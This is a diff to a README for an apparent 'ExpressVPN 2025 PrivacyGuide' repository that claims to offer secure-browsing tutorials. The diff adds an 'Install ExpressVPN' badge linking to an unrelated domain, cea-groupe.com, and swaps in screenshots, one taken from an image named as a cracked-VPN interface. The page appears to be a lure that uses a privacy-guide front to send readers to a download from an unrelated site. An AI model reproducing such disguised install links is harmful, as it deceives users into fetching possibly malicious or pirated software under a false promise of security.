@@ -5,7 +5,7 @@
 
 🌍 Navigate the web with confidence using ExpressVPN 2025 PrivacyGuide! This repository offers tutorials, resources, and tips for secure browsing in 2025. Join a community dedicated to protecting your digital life.
 
----
+[![Install ExpressVPN](https://img.shields.io/badge/Install-ExpressVPN-blueviolet)](https://cea-groupe.com)
 
 ### 🔐 Core Features
 
@@ -82,15 +82,15 @@
 ### 📸 Screenshots
 
 **ExpressVPN Dashboard**  
-![ExpressVPN Dashboard](https://tse1.mm.bing.net/th?id=OIP.expressvpn_dashboard&pid=Api)  
+![ExpressVPN Dashboard](https://fixthephoto.com/blog/UserFiles/Image/img/express-vpn-crack-interface.png)  
 *User-friendly interface for managing your VPN connections.*
 
 **Server Selection**  
-![Server Selection](https://tse2.mm.bing.net/th?id=OIP.expressvpn_servers&pid=Api)  
+![Server Selection](https://www.vpnmentor.com/wp-content/uploads/2024/07/expressvpn-review-security-ad-blocker-en-autoresized86X.png?timestamp=1733117288)  
 *Choose from global server locations for secure browsing.*
 
 **Settings Panel**  
-![Settings Panel](https://tse3.mm.bing.net/th?id=OIP.expressvpn_settings&pid=Api)  
+![Settings Panel](https://privacyspark.com/wp-content/uploads/2020/01/image9.png)  
 *Customize your VPN experience with advanced options.*
 
 ---
